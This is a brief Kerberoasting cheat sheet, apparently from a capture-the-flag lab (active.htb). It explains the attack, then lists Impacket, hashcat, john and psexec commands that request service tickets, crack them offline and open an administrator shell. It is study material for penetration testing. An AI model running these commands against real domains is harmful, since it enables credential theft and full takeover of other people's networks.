____

Kerberos is a protocol for authentication used in Windows Active Directory environments (though it can be used for auth to Linux hosts as well). In 2014, Tim Medin presented an attack on Kerberos he called [Kerberoasting](https://www.redsiege.com/wp-content/uploads/2020/08/Kerberoastv4.pdf). It’s worth reading through the presentation, as Tim uses good graphics to illustrate the process, but I’ll try to give a simple overview.

When you want to authenticate to some service using Kerberos, you contact the DC and tell it to which system service you want to authenticate. It encrypts a response to you with the service user’s password hash. You send that response to the service, which can decrypt it with it’s password, check who you are, and decide it if wants to let you in.

In a Kerberoasting attack, rather than sending the encrypted ticket from the DC to the service, you will use off-line brute force to crack the password associated with the service.

Most of the time you will need an active account on the domain in order to initial Kerberoast, but if the DC is configured with [UserAccountControl setting “Do not require Kerberos preauthentication” enabled](https://harmj0y.medium.com/roasting-as-reps-e6179a65216b), it is possible to request and receive a ticket to crack without a valid account on the domain.


## Get Hash

```bash
GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
```

## Decrypt

```bash
hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force
```

```bash
john --wordlist=/usr/share/seclists/rockyou.txt GetUserSPNs.out
```

Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

```bash
sudo rdate -n $IP
```

# Psexec

```bash
impacket-psexec active.htb/administrator@10.10.10.100 cmd.exe
```
